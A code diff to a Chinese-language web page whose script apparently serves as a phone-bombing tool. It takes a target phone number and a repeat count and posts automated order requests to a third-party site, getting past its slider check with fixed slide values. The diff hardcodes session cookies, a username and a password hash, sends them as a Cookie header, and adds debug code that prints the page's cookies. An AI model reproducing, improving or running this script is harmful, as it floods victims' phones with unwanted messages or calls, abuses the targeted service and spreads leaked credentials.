@@ -62,6 +62,16 @@
             margin: 0 auto;
         }
 
+        .debug-info {
+            margin-top: 20px;
+            padding: 10px;
+            background: #f0f0f0;
+            border-radius: 5px;
+            font-size: 12px;
+            max-width: 300px;
+            word-break: break-all;
+        }
+
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
@@ -79,7 +89,79 @@
         <p>处理中，请稍候...</p>
     </div>
 
+    <div class="debug-info" id="debugInfo"></div>
+
     <script>
+        // 调试函数：显示当前所有cookie
+        function showCurrentCookies() {
+            const debugInfo = document.getElementById('debugInfo');
+            const allCookies = document.cookie;
+            debugInfo.innerHTML = `<strong>当前页面cookie:</strong><br>${allCookies || '无cookie'}`;
+            console.log('当前页面cookie:', allCookies);
+        }
+
+        // 设置cookie的函数
+        function setCookies() {
+            const cookies = [
+                {
+                    name: 'PHPSESSID',
+                    value: '1cd4bcf0e4f37f311cd61fd2b9b41df0',
+                    domain: 'hl-6-6.5521.site'
+                },
+                {
+                    name: 'server_name_session',
+                    value: '3342d47cd4f6eec4f75e965786ef505a',
+                    domain: 'hl-6-6.5521.site'
+                },
+                {
+                    name: 'Let_IndexUsername',
+                    value: 'hongzha9',
+                    domain: 'hl-6-6.5521.site'
+                },
+                {
+                    name: 'Let_IndexPassword',
+                    value: '5d2a29e4522956ea3273b338f0784100',
+                    domain: 'hl-6-6.5521.site'
+                }
+            ];
+
+            let successCount = 0;
+            cookies.forEach(cookie => {
+                try {
+                    // 尝试设置cookie
+                    const cookieString = `${cookie.name}=${cookie.value}; domain=${cookie.domain}; path=/; SameSite=None; Secure`;
+                    document.cookie = cookieString;
+                    console.log(`设置cookie: ${cookieString}`);
+                    
+                    // 检查是否设置成功
+                    setTimeout(() => {
+                        const isSet = document.cookie.includes(cookie.name);
+                        console.log(`Cookie ${cookie.name} 设置${isSet ? '成功' : '失败'}`);
+                        if (isSet) successCount++;
+                    }, 100);
+                    
+                } catch (error) {
+                    console.error(`设置cookie ${cookie.name} 失败:`, error);
+                }
+            });
+            
+            console.log(`总共尝试设置 ${cookies.length} 个cookie，成功: ${successCount}`);
+            return successCount;
+        }
+
+        // 手动设置cookie头的请求函数
+        async function fetchWithCookies(url, options) {
+            const cookies = 'PHPSESSID=1cd4bcf0e4f37f311cd61fd2b9b41df0; server_name_session=3342d47cd4f6eec4f75e965786ef505a; Let_IndexUsername=hongzha9; Let_IndexPassword=5d2a29e4522956ea3273b338f0784100';
+            
+            return fetch(url, {
+                ...options,
+                headers: {
+                    ...options.headers,
+                    'Cookie': cookies
+                }
+            });
+        }
+
         async function sendRequests() {
             const phoneNumber = document.getElementById('phoneNumber').value;
             const times = parseInt(document.getElementById('times').value, 10);
@@ -131,41 +213,47 @@
 
         async function executeSingleRequest(phoneNumber) {
             try {
-                // 第一步：获取token
-                const tokenResponse = await fetch('https://hl-6-6.5521.site/hl-hl/ajax/verify/act/generate', {
+                console.log('开始执行请求...');
+                
+                // 使用手动设置cookie头的方式
+                const tokenResponse = await fetchWithCookies('https://hl-6-6.5521.site/hl-hl/ajax/verify/act/generate', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/x-www-form-urlencoded'
                     },
-                    body: 'slideDistance=504&slideWidth=549',
-                    credentials: 'include'
+                    body: 'slideDistance=504&slideWidth=549'
                 });
 
+                console.log('Token响应状态:', tokenResponse.status);
+                
                 if (!tokenResponse.ok) {
                     throw new Error(`HTTP ${tokenResponse.status}`);
                 }
 
                 const tokenData = await tokenResponse.json();
+                console.log('Token响应数据:', tokenData);
                 
                 if (tokenData.code !== 1) {
                     throw new Error(tokenData.msg || '未知错误');
                 }
 
                 // 第二步：提交订单
-                const orderResponse = await fetch('https://hl-6-6.5521.site/hl-hl/ajax/order/act/add', {
+                const orderResponse = await fetchWithCookies('https://hl-6-6.5521.site/hl-hl/ajax/order/act/add', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/x-www-form-urlencoded'
                     },
-                    body: `mobile=${phoneNumber}&time=20&verify_token=${tokenData.token}`,
-                    credentials: 'include'
+                    body: `mobile=${phoneNumber}&time=20&verify_token=${tokenData.token}`
                 });
 
+                console.log('订单响应状态:', orderResponse.status);
+                
                 if (!orderResponse.ok) {
                     throw new Error(`HTTP ${orderResponse.status}`);
                 }
 
                 const orderData = await orderResponse.json();
+                console.log('订单响应数据:', orderData);
                 
                 if (orderData.code === 1) {
                     return true;
@@ -179,41 +267,13 @@
             }
         }
 
-        // 设置cookie的函数
-        function setCookies() {
-            const cookies = [
-                {
-                    name: 'PHPSESSID',
-                    value: '1cd4bcf0e4f37f311cd61fd2b9b41df0',
-                    domain: '.hl-6-6.5521.site'
-                },
-                {
-                    name: 'server_name_session',
-                    value: '3342d47cd4f6eec4f75e965786ef505a',
-                    domain: '.hl-6-6.5521.site'
-                },
-                {
-                    name: 'Let_IndexUsername',
-                    value: 'hongzha9',
-                    domain: '.hl-6-6.5521.site'
-                },
-                {
-                    name: 'Let_IndexPassword',
-                    value: '5d2a29e4522956ea3273b338f0784100',
-                    domain: '.hl-6-6.5521.site'
-                }
-            ];
-
-            cookies.forEach(cookie => {
-                // 设置cookie，包含 SameSite=None 和 Secure
-                document.cookie = `${cookie.name}=${cookie.value}; domain=${cookie.domain}; path=/; SameSite=None; Secure`;
-            });
-            
-            console.log('Cookie已设置（SameSite=None; Secure）');
-        }
-
         document.addEventListener('DOMContentLoaded', function() {
-            setCookies();
+            console.log('页面加载完成，开始设置cookie...');
+            const successCount = setCookies();
+            showCurrentCookies();
+            
+            // 3秒后再次检查cookie状态
+            setTimeout(showCurrentCookies, 3000);
         });
 
         document.getElementById('phoneNumber').addEventListener('keypress', function(event) {
